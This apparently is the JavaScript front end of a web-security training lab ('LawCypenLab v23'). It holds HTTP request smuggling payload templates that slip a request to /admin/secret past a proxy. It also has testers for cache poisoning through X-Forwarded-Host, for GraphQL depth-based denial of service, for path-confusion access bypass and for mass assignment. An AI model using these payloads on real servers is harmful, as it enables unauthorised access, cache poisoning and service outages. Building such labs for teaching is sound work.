// LawCypenLab v23 :: HTTP Smuggling, WebSocket CSWSH, Path Confusion, Cache Poisoning, GraphQL DoS

// ── HTTP Request Smuggling PoC Builder ───────────────────────────────
const SMUGGLE_TEMPLATES = {
  cl_te: `POST / HTTP/1.1\r\nHost: aegis-station.local\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGETE`,
  te_cl: `POST / HTTP/1.1\r\nHost: aegis-station.local\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n5e\r\nPOST /admin/secret HTTP/1.1\r\nHost: aegis-station.local\r\nContent-Length: 0\r\n\r\n0\r\n\r\n`,
  h2_cl: `POST / HTTP/2\r\nHost: aegis-station.local\r\nContent-Length: 0\r\n\r\nGET /internal HTTP/1.1\r\nHost: aegis-station.local\r\nX-Ignore: `,
};

function loadSmuggleTemplate(type) {
  const ta = document.getElementById('smuggle-ta');
  if (ta) ta.value = SMUGGLE_TEMPLATES[type] || '';
  buildSmuggleVis(type);
}

function buildSmuggleVis(type) {
  const vis = document.getElementById('smuggle-vis');
  if (!vis) return;
  const labels = {
    cl_te: {tag:'CL.TE',front:'Reads Content-Length → stops at byte 6',back:'Reads Transfer-Encoding → receives "0\\r\\n\\r\\n" then "GETE" as next request prefix'},
    te_cl: {tag:'TE.CL',front:'Reads Transfer-Encoding → strips chunked envelope',back:'Reads Content-Length=4 → partial body; "POST /admin..." treated as new request'},
    h2_cl: {tag:'H2.CL',front:'HTTP/2 (no Content-Length needed) strips header',back:'HTTP/1.1 downgrade: Content-Length: 0 causes leftover bytes to poison queue'},
  };
  const l = labels[type] || labels.cl_te;
  vis.innerHTML = `<div style="display:grid;grid-template-columns:1fr auto 1fr;gap:0;border:1px solid var(--hairline);border-radius:var(--radius);overflow:hidden;">
    <div style="padding:14px;background:var(--panel);">
      <div style="font-size:10px;font-family:'JetBrains Mono',monospace;letter-spacing:.1em;color:var(--cyan);margin-bottom:8px;">FRONT-END PROXY</div>
      <div style="font-size:12px;color:var(--dim);">${l.front}</div>
    </div>
    <div style="width:50px;display:flex;flex-direction:column;align-items:center;justify-content:center;background:var(--panel-2);padding:8px 0;gap:6px;">
      <span class="desync-badge ${type.replace('_','-')}">${l.tag}</span>
      <div style="font-size:16px;">⟷</div>
    </div>
    <div style="padding:14px;background:var(--panel);">
      <div style="font-size:10px;font-family:'JetBrains Mono',monospace;letter-spacing:.1em;color:var(--danger);margin-bottom:8px;">BACK-END SERVER</div>
      <div style="font-size:12px;color:var(--dim);">${l.back}</div>
    </div>
  </div>`;
}

// Send smuggling simulation to backend
async function sendSmuggleTest() {
  const out = document.getElementById('smuggle-out');
  if (out) { out.style.display='block'; out.textContent='Sending…'; }
  try {
    const r = await fetch('/smuggler/test', {method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({cl: document.getElementById('cl-val')?.value, te: document.getElementById('te-val')?.value,
        body: document.getElementById('smuggle-ta')?.value})});
    const d = await r.json();
    if (out) out.textContent = `HTTP ${r.status}\n\n${JSON.stringify(d,null,2)}`;
  } catch(e) { if(out) out.textContent='Error: '+e.message; }
}

// ── WebSocket Feed (using SSE) ────────────────────────────────────────
let _wsSource = null;
function connectWsFeed() {
  const feed = document.getElementById('ws-feed');
  const dot  = document.getElementById('ws-dot');
  const btn  = document.getElementById('ws-btn');
  if (!feed) return;
  if (_wsSource) { _wsSource.close(); _wsSource=null; if(dot) dot.className='ws-dot disconnected'; if(btn) btn.textContent='Connect'; return; }
  _wsSource = new EventSource('/ws/feed');
  if (dot) dot.className = 'ws-dot connected';
  if (btn) btn.textContent = 'Disconnect';
  _wsSource.onmessage = e => {
    const line = document.createElement('div');
    line.className = 'ws-msg' + (e.data.includes('secret')||e.data.includes('OVERRIDE')||e.data.includes('AUTH') ? ' vuln' : '');
    const ts = new Date().toTimeString().slice(0,8);
    line.innerHTML = `<span class="ws-ts">${ts}</span><span class="ws-dir in">←</span><span class="ws-body">${e.data}</span>`;
    feed.appendChild(line);
    feed.scrollTop = feed.scrollHeight;
  };
  _wsSource.onerror = () => { if(dot) dot.className='ws-dot disconnected'; _wsSource=null; if(btn) btn.textContent='Connect'; };
}

// ── Cache Poisoning Tester ────────────────────────────────────────────
async function testCachePoison(poisonedHost) {
  const out = document.getElementById('cache-out');
  if (out) { out.style.display='block'; out.textContent='Sending…'; }
  const hdrs = {'Content-Type':'application/json'};
  if (poisonedHost) hdrs['X-Forwarded-Host'] = poisonedHost;
  try {
    const r = await fetch('/api/cache-test', {headers: hdrs});
    const d = await r.json();
    if (out) out.textContent = `HTTP ${r.status}\n\n` + JSON.stringify(d,null,2);
  } catch(e) { if(out) out.textContent='Error: '+e.message; }
}

// ── GraphQL Depth DoS ─────────────────────────────────────────────────
function buildDepthQuery(depth) {
  let q = '{ crew';
  for (let i = 0; i < depth; i++) q += ' { friends';
  q += ' { id username role }';
  for (let i = 0; i < depth; i++) q += ' }';
  q += ' }';
  return q;
}

async function testGraphqlDepth(depth) {
  const out   = document.getElementById('gql-dos-out');
  const meter = document.getElementById('depth-fill');
  const label = document.getElementById('depth-label');
  const query = buildDepthQuery(depth);
  if (out) { out.style.display='block'; out.textContent=`Sending depth=${depth} query…`; }
  if (label) label.textContent = `depth: ${depth}`;
  const t0 = performance.now();
  try {
    const r = await fetch('/api/v5/graphql/depth', {method:'POST',
      headers:{'Content-Type':'application/json'}, body: JSON.stringify({query})});
    const d = await r.json();
    const ms = Math.round(performance.now()-t0);
    const pct = Math.min(100, depth * 4);
    if (meter) { meter.style.width=pct+'%'; meter.style.background = depth>15?'var(--danger)':depth>8?'var(--amber)':'var(--cyan)'; }
    if (out) out.textContent = `depth=${depth}  client_ms=${ms}  server_ms=${d.elapsed_ms}\n\n${JSON.stringify(d,null,2)}`;
  } catch(e) { if(out) out.textContent='Error: '+e.message; }
}

// ── Path Confusion Tester ─────────────────────────────────────────────
async function testPathConfusion(path) {
  const inp = document.getElementById('path-input');
  const out = document.getElementById('path-out');
  const p   = path || inp?.value || '/admin';
  if (out) { out.style.display='block'; out.textContent='Checking…'; out.className='path-result'; }
  try {
    const r = await fetch('/path-confusion/check', {method:'POST',
      headers:{'Content-Type':'application/x-www-form-urlencoded'},
      body:'path='+encodeURIComponent(p)});
    const d = await r.json();
    if (out) {
      out.className = 'path-result ' + (d.accessible ? (d.original_path !== d.normalized ? 'bypassed' : 'allowed') : 'blocked');
      out.textContent = JSON.stringify(d,null,2);
    }
    if (inp) inp.value = p;
  } catch(e) { if(out) out.textContent='Error: '+e.message; }
}

// ── BOPLA test ────────────────────────────────────────────────────────
async function testBopla(uid, updates) {
  const out = document.getElementById('bopla-out');
  if (out) { out.style.display='block'; out.textContent='Sending PATCH…'; }
  const method = updates ? 'PATCH' : 'GET';
  const opts = {method, headers:{'Content-Type':'application/json'}};
  if (updates) opts.body = JSON.stringify(updates);
  try {
    const r = await fetch(`/api/v7/crew/${uid}`, opts);
    const d = await r.json();
    if (out) out.textContent = `HTTP ${r.status}\n\n${JSON.stringify(d,null,2)}`;
  } catch(e) { if(out) out.textContent='Error: '+e.message; }
}
